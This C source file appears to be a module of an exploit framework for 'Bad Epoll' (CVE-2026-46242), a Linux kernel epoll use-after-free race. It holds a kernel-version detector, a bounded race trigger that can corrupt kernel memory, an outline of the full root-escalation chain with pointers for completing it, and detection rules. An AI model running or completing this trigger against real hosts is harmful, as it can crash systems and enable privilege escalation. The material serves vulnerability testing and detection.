/*
 * bad_epoll_cve_2026_46242 — SKELETONKEY module
 *
 * CVE-2026-46242 — "Bad Epoll", a race-condition use-after-free in the
 * Linux kernel epoll subsystem (fs/eventpoll.c). On the file-teardown
 * path, ep_remove() clears file->f_ep under file->f_lock but keeps
 * *using* the file inside the critical section (the hlist_del_rcu() over
 * the eventpoll's refs list + spin_unlock). A concurrent __fput() of a
 * linked epoll file can observe the transient NULL f_ep, skip
 * eventpoll_release_file(), and go straight to f_op->release — freeing a
 * struct eventpoll that the first path is still walking. The result is a
 * UAF on a live kernel object reachable by ANY unprivileged local user:
 * epoll_create1(2) / epoll_ctl(2) / close(2) need no capability, no user
 * namespace, and no special CONFIG (epoll is always built in). That is
 * what makes it nasty — there is no unprivileged-userns stopgap to close
 * the way there is for the netfilter bugs; the only fix is to patch.
 *
 * Public exploit (Jaeyoung Chung / J-jaeyoung, "bad-epoll"), submitted
 * to Google's kernelCTF: four epoll objects in two pairs — one pair
 * drives the race, the other is the victim — turn the 8-byte UAF write
 * into control of a struct file via a cross-cache attack, then arbitrary
 * kernel read via /proc/self/fdinfo and a ROP chain to a root shell.
 * ~99% reliable despite a race window only ~6 instructions wide; it
 * rarely trips KASAN, which is precisely why the bug hid for three
 * years.
 *
 * CWE-416 (Use After Free) via CWE-362 (race). Introduced by commit
 * 58c9b016e128 (Linux 6.4, 2023-04-08); fixed by commit
 * a6dc643c69311677c574a0f17a3f4d66a5f3744b (merged for 7.1-rc1,
 * 2026-04-24), stable backport 7.0.13. NOT in CISA KEV (brand new).
 *
 * STATUS: 🟡 TRIGGER (reconstructed) — primitive-only, NOT VM-verified.
 *   This is a genuine SMP kernel race that, if *won*, frees a live
 *   struct eventpoll — real memory corruption that (per the public
 *   analysis) rarely trips KASAN, so a won-but-not-completed race can
 *   silently destabilise a vulnerable host rather than cleanly oops.
 *   For that reason this module is deliberately UNDER-DRIVEN: exploit()
 *   builds the epoll object graph and exercises the concurrent-close
 *   window (ep_remove vs __fput) a small, bounded number of times inside
 *   a fork-isolated child, snapshots the eventpoll slab, and STOPS. It
 *   does NOT grind the race to a win, does NOT perform the cross-cache
 *   reclaim, and does NOT bundle the per-kernel fdinfo arbitrary-read +
 *   ROP that lands root (per-build offsets refused). It returns
 *   EXPLOIT_FAIL and never claims root it did not get. The trigger is
 *   reconstructed from the public kernelCTF PoC, not VM-verified. This
 *   is why it carries the lowest safety rank in --auto (a kernel race is
 *   the least predictable class; see skeletonkey.c module_safety_rank).
 *
 * detect() is a pure version gate: vulnerable iff the running kernel is
 *   >= 6.4 (the commit that introduced the bug) AND below the fix on its
 *   branch (Debian: bookworm/6.1 and bullseye/5.10 are "not affected —
 *   vulnerable code not present"; trixie/6.12 still vulnerable at time of
 *   writing; forky/sid fixed at 7.0.13/7.0.14). No userns / CONFIG
 *   precondition — any unprivileged user can reach it.
 *
 * Affected range (Debian security tracker, source of record):
 *   introduced 6.4 (58c9b016e128); mainline fix in 7.1-rc1
 *   (a6dc643c6931); stable backport 7.0.13. 6.6/6.12 LTS backports had
 *   not landed at time of writing → version-only VULNERABLE there
 *   (tools/refresh-kernel-ranges.py will extend the table as distros
 *   publish). 6.1 and older predate the bug.
 *
 * arch_support: x86_64 (the cross-cache groom + any future finisher are
 *   x86_64-tuned; detect() and the reachability trigger are arch-neutral
 *   but we only claim x86_64 for exploit()).
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"

#include <stdint.h>
#include <stdatomic.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <pthread.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/epoll.h>

/* ------------------------------------------------------------------
 * Kernel-range table. The fix landed mainline in 7.1-rc1
 * (a6dc643c6931); the only stable backport that had shipped at time of
 * writing is 7.0.13 (Debian forky 7.0.13-1 / sid 7.0.14-1). A single
 * {7,0,13} entry plus the ">= 6.4 introduced" gate below is sufficient:
 * kernel_range_is_patched() treats any branch strictly newer than every
 * entry (i.e. 7.1+) as patched-via-mainline, and every branch at or
 * below 7.0 with no exact entry (6.4..6.12, 7.0.<13) as still
 * vulnerable — which is exactly the Debian tracker's verdict. Add
 * 6.6.x / 6.12.x entries here when those LTS backports land (the drift
 * checker flags them). security-tracker.debian.org is the source.
 * ------------------------------------------------------------------ */
static const struct kernel_patched_from bad_epoll_patched_branches[] = {
    {7, 0, 13},   /* 7.0.x (Debian forky 7.0.13-1 / sid 7.0.14-1); 7.1+ inherits */
};

static const struct kernel_range bad_epoll_range = {
    .patched_from = bad_epoll_patched_branches,
    .n_patched_from = sizeof(bad_epoll_patched_branches) /
                      sizeof(bad_epoll_patched_branches[0]),
};

static skeletonkey_result_t bad_epoll_detect(const struct skeletonkey_ctx *ctx)
{
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] bad_epoll: host fingerprint missing kernel "
                            "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* The vulnerable ep_remove()/__fput() interleaving was introduced by
     * commit 58c9b016e128 in 6.4. Below that the code pattern is absent
     * (Debian marks bookworm/6.1 and bullseye/5.10 "not affected —
     * vulnerable code not present"). */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 6, 4, 0)) {
        if (!ctx->json)
            fprintf(stderr, "[i] bad_epoll: kernel %s predates the vulnerable "
                            "epoll teardown path (introduced 6.4) — not affected\n",
                    v->release);
        return SKELETONKEY_OK;
    }

    if (kernel_range_is_patched(&bad_epoll_range, v)) {
        if (!ctx->json)
            fprintf(stderr, "[+] bad_epoll: kernel %s is patched (>= 7.0.13 / "
                            "7.1+ inherits the mainline fix)\n", v->release);
        return SKELETONKEY_OK;
    }

    if (!ctx->json) {
        fprintf(stderr, "[!] bad_epoll: VULNERABLE — kernel %s in range "
                        "[6.4, fix); epoll teardown race reachable by any "
                        "unprivileged user (no userns / CONFIG gate)\n",
                v->release);
        fprintf(stderr, "[i] bad_epoll: no unprivileged-userns stopgap applies "
                        "here — the only fix is to patch the kernel\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ------------------------------------------------------------------
 * Reconstructed reachability trigger (deliberately under-driven).
 *
 * Faithful minimal shape of the public PoC's race pair: a "waiter"
 * epoll watches a "target" epoll; the two are then closed concurrently
 * from CPU-pinned contexts so ep_remove() (driven by fput of the
 * watched target) races __fput() of the waiter eventpoll. The PoC
 * widens the ~6-instruction window with close(dup(target)) storms that
 * induce false-sharing on the file's f_count cache line and stall the
 * racer's read of f_op.
 *
 * We reproduce the OBJECT GRAPH and the CONCURRENT-CLOSE WINDOW with a
 * small iteration + wall-clock budget, then stop. We do NOT reclaim the
 * freed slab, do NOT run the depth-3 nesting oracle that only fires
 * after a real UAF write, and do NOT weaponise. The honest witness is
 * therefore coarse: a signal in the isolated child (a KASAN oops or
 * corruption fault, if the race happened to fire) and an eventpoll-slab
 * delta. Absence of a witness does NOT prove the host is safe.
 * ------------------------------------------------------------------ */
#define BEP_RACE_ITERS        48       /* bounded — reachability probe, not a winner */
#define BEP_DUP_CLOSE_ITERS   32       /* window-widening false-sharing storm */
#define BEP_RACE_BUDGET_SECS  2        /* honest short cap (public PoC uses 5 min) */

static void bep_pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    (void)sched_setaffinity(0, sizeof set, &set);   /* best-effort */
}

struct bep_racer {
    int              waiter_fd;   /* fd the racer closes */
    atomic_int      *go;          /* fire signal from main */
    atomic_int      *closed;      /* set once the racer has closed */
};

static void *bep_racer_fn(void *arg)
{
    struct bep_racer *r = (struct bep_racer *)arg;
    bep_pin_cpu(0);
    /* Spin until main is at the close point, then race. */
    while (atomic_load_explicit(r->go, memory_order_acquire) == 0)
        ;
    close(r->waiter_fd);
    atomic_store_explicit(r->closed, 1, memory_order_release);
    return NULL;
}

static long bep_slabinfo_active(const char *slab)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    long active = -1;
    size_t n = strlen(slab);
    while (fgets(line, sizeof line, f)) {
        if (strncmp(line, slab, n) == 0 && line[n] == ' ') {
            long a;
            if (sscanf(line + n, " %ld", &a) == 1) active = a;
            break;
        }
    }
    fclose(f);
    return active;
}

/* One race attempt: build (target, waiter) with waiter watching target,
 * then close both concurrently. Returns 0 normally; the interesting
 * outcome (a won race) manifests as a signal that the parent observes,
 * not a return value. */
static void bep_one_attempt(void)
{
    int target = epoll_create1(EPOLL_CLOEXEC);
    if (target < 0) return;
    int waiter = epoll_create1(EPOLL_CLOEXEC);
    if (waiter < 0) { close(target); return; }

    /* waiter watches target — this is the link that makes closing target
     * drive eventpoll_release_file()/ep_remove() over waiter's eventpoll. */
    struct epoll_event ev = { .events = EPOLLIN };
    ev.data.fd = target;
    if (epoll_ctl(waiter, EPOLL_CTL_ADD, target, &ev) < 0) {
        close(waiter); close(target); return;
    }

    atomic_int go = 0, closed = 0;
    struct bep_racer ra = { .waiter_fd = waiter, .go = &go, .closed = &closed };
    pthread_t th;
    if (pthread_create(&th, NULL, bep_racer_fn, &ra) != 0) {
        close(waiter); close(target); return;
    }

    /* Widen the window: false-sharing storm on target's f_count line,
     * then release the racer and close target ourselves so ep_remove
     * (our fput of the watched file) overlaps __fput of the waiter. */
    for (int i = 0; i < BEP_DUP_CLOSE_ITERS; i++) {
        int d = dup(target);
        if (d >= 0) close(d);
    }
    atomic_store_explicit(&go, 1, memory_order_release);
    close(target);

    pthread_join(th, NULL);
}

static skeletonkey_result_t bad_epoll_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = bad_epoll_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] bad_epoll: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] bad_epoll: already running as root\n");
        return SKELETONKEY_OK;
    }

    if (!ctx->json)
        fprintf(stderr, "[*] bad_epoll: reconstructed reachability probe — builds "
                        "the epoll race pair and exercises the ep_remove vs __fput "
                        "close window (%d bounded attempts, %ds cap), then stops. "
                        "The cross-cache → struct file control → fdinfo arb-read → "
                        "ROP root-pop is NOT bundled.\n",
                BEP_RACE_ITERS, BEP_RACE_BUDGET_SECS);

    /* Fork-isolated: a won race frees a live struct eventpoll. On a
     * KASAN kernel that oopses (contained to the child); on a plain
     * vulnerable kernel it may corrupt — which is exactly why we bound
     * the attempt count hard and never reclaim. */
    pid_t child = fork();
    if (child < 0) { perror("[-] fork"); return SKELETONKEY_TEST_ERROR; }

    if (child == 0) {
        bep_pin_cpu(1);
        long before = bep_slabinfo_active("eventpoll");
        if (before < 0) before = bep_slabinfo_active("kmalloc-192");

        time_t deadline = time(NULL) + BEP_RACE_BUDGET_SECS;
        int done = 0;
        for (int i = 0; i < BEP_RACE_ITERS && time(NULL) < deadline; i++) {
            bep_one_attempt();
            done = i + 1;
        }

        long after = bep_slabinfo_active("eventpoll");
        if (after < 0) after = bep_slabinfo_active("kmalloc-192");
        if (!ctx->json)
            fprintf(stderr, "[i] bad_epoll: %d close-race attempts fired; "
                            "eventpoll/kmalloc-192 active: %ld → %ld\n",
                    done, before, after);
        _exit(100);   /* honest: window exercised, race not driven to a win */
    }

    int status;
    waitpid(child, &status, 0);
    if (WIFSIGNALED(status)) {
        if (!ctx->json)
            fprintf(stderr, "[!] bad_epoll: child died by signal %d — the epoll "
                            "teardown race may have fired (KASAN oops / corruption "
                            "fault). This is the bug, but no root was obtained.\n",
                    WTERMSIG(status));
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (WIFEXITED(status) && WEXITSTATUS(status) == 100) {
        if (!ctx->json) {
            fprintf(stderr, "[!] bad_epoll: race window exercised (reconstructed "
                            "primitive). Full chain is NOT bundled and the trigger "
                            "is not VM-verified — honest EXPLOIT_FAIL.\n");
            fprintf(stderr, "[i] bad_epoll: to complete: port the public kernelCTF "
                            "cross-cache reclaim (eventpoll slab → pipe buffers) + "
                            "/proc/self/fdinfo arbitrary read + ROP for "
                            "CVE-2026-46242.\n");
        }
        return SKELETONKEY_EXPLOIT_FAIL;
    }
    if (!ctx->json)
        fprintf(stderr, "[-] bad_epoll: probe setup failed (child rc=%d)\n",
                WIFEXITED(status) ? WEXITSTATUS(status) : -1);
    return SKELETONKEY_EXPLOIT_FAIL;
}

#else  /* !__linux__ */

static skeletonkey_result_t bad_epoll_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] bad_epoll: Linux-only module (epoll teardown race "
                        "UAF) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t bad_epoll_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] bad_epoll: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}

#endif /* __linux__ */

/* ----- Embedded detection rules -----
 *
 * Honesty note (see MODULE.md): epoll is one of the most heavily used
 * kernel interfaces on Earth. epoll_create1 / epoll_ctl / close from an
 * unprivileged process is the steady-state behaviour of nginx, systemd,
 * every language runtime's event loop, etc. There is NO clean behavioural
 * signature for this exploit, and it rarely trips KASAN. These rules are
 * therefore intentionally weak/structural — the reliable signal is the
 * post-exploitation privilege transition, not the epoll traffic. Tune
 * hard or you will drown in false positives.
 */
static const char bad_epoll_auditd[] =
    "# Bad Epoll — epoll teardown race UAF (CVE-2026-46242) — auditd rules\n"
    "# There is no high-fidelity syscall signature: epoll_create1/epoll_ctl\n"
    "# are ubiquitous and benign. The only reliable smoking gun is an\n"
    "# unprivileged process transitioning to euid 0 without going through a\n"
    "# setuid binary. Pair with kernel-log monitoring for KASAN/oops lines.\n"
    "-a always,exit -F arch=b64 -S setresuid -F a0=0 -F a1=0 -F a2=0 -F auid>=1000 -F auid!=4294967295 -k skeletonkey-bad-epoll-priv\n"
    "-a always,exit -F arch=b64 -S setuid -F a0=0 -F auid>=1000 -F auid!=4294967295 -k skeletonkey-bad-epoll-priv\n";

static const char bad_epoll_sigma[] =
    "title: Possible CVE-2026-46242 Bad Epoll teardown race UAF\n"
    "id: 7c1e9d2a-skeletonkey-bad-epoll\n"
    "status: experimental\n"
    "description: |\n"
    "  Bad Epoll (CVE-2026-46242) is a race UAF in fs/eventpoll.c reachable\n"
    "  by any unprivileged user via epoll_create1/epoll_ctl/close. There is\n"
    "  no reliable syscall-level signature — epoll traffic is ubiquitous and\n"
    "  the exploit rarely trips KASAN. This rule keys on the POST-exploitation\n"
    "  tell: a previously-unprivileged process gaining euid 0 with no setuid\n"
    "  execve in its ancestry. Expect false positives from legitimate\n"
    "  privilege-management daemons; correlate with kernel oops/BUG lines.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  uid0:  {type: 'SYSCALL', syscall: 'setresuid', a0: 0, a1: 0, a2: 0}\n"
    "  unpriv: {auid|expression: '>= 1000'}\n"
    "  condition: uid0 and unpriv\n"
    "level: medium\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2026.46242]\n";

static const char bad_epoll_falco[] =
    "- rule: Unprivileged process gained root, no setuid exec (possible CVE-2026-46242)\n"
    "  desc: |\n"
    "    Bad Epoll (CVE-2026-46242) epoll teardown race UAF has no clean\n"
    "    behavioural signature — epoll syscalls are ubiquitous. This rule\n"
    "    fires on the post-exploitation effect: a non-root process becoming\n"
    "    root outside a setuid binary. False positives: privilege-management\n"
    "    daemons, su/sudo flows (filter those). Correlate with kernel oops.\n"
    "  condition: >\n"
    "    evt.type in (setuid, setresuid) and evt.arg.uid = 0 and\n"
    "    not proc.is_setuid = true and user.uid != 0\n"
    "  output: >\n"
    "    Non-setuid unprivileged->root transition (possible CVE-2026-46242 Bad Epoll)\n"
    "    (user=%user.name proc=%proc.name pid=%proc.pid ppid=%proc.ppid)\n"
    "  priority: WARNING\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2026.46242]\n";

const struct skeletonkey_module bad_epoll_module = {
    .name           = "bad_epoll",
    .cve            = "CVE-2026-46242",
    .summary        = "epoll ep_remove-vs-__fput teardown race UAF (\"Bad Epoll\") — frees a live struct eventpoll; unprivileged, no userns needed",
    .family         = "eventpoll",
    .kernel_range   = "6.4 <= K < fix (introduced 58c9b016e128 / 6.4); fixed a6dc643c6931 (7.1-rc1), stable backport 7.0.13; 6.6/6.12 LTS backports pending; 6.1 and older not affected",
    .detect         = bad_epoll_detect,
    .exploit        = bad_epoll_exploit,
    .mitigate       = NULL,   /* mitigation: upgrade kernel — no unprivileged-userns/CONFIG stopgap applies (epoll needs none) */
    .cleanup        = NULL,   /* trigger creates only throwaway epoll fds in a fork-isolated child; no host artifacts */
    .detect_auditd  = bad_epoll_auditd,
    .detect_sigma   = bad_epoll_sigma,
    .detect_yara    = NULL,   /* pure in-kernel race — no file artifact to match */
    .detect_falco   = bad_epoll_falco,
    .opsec_notes    = "detect() is a pure kernel-version gate (vulnerable iff >= 6.4 introduced AND below the fix on-branch; stable backport 7.0.13, 7.1+ inherits; 6.1/5.10 not affected) — no userns or CONFIG probe, because epoll is reachable by every unprivileged user. exploit() forks a CPU-pinned child that builds the epoll race pair (a waiter eventpoll watching a target eventpoll) and exercises the ep_remove-vs-__fput concurrent-close window a hard-bounded number of times (48 attempts / 2s), widening it with close(dup()) false-sharing storms, snapshots the eventpoll/kmalloc-192 slab, and returns EXPLOIT_FAIL. It is deliberately UNDER-DRIVEN: it does not grind the race to a win, does not perform the cross-cache reclaim, and does not bundle the /proc/self/fdinfo arbitrary-read + ROP root-pop (per-kernel offsets refused); the trigger is reconstructed from the public kernelCTF PoC, not VM-verified. Telemetry footprint is nearly invisible: a burst of epoll_create1/epoll_ctl/dup/close from one process (indistinguishable from any event-loop program) and, only if the race actually fires on a vulnerable host, a possible KASAN oops or silent corruption (the bug rarely trips KASAN). No persistent files. The reliable detection signal is the post-exploitation euid-0 transition, not the epoll activity — see the shipped rules. Lowest --auto safety rank in the corpus: a kernel race that frees a live struct file is the least predictable thing here.",
    .arch_support   = "x86_64",
};

void skeletonkey_register_bad_epoll(void)
{
    skeletonkey_register(&bad_epoll_module);
}
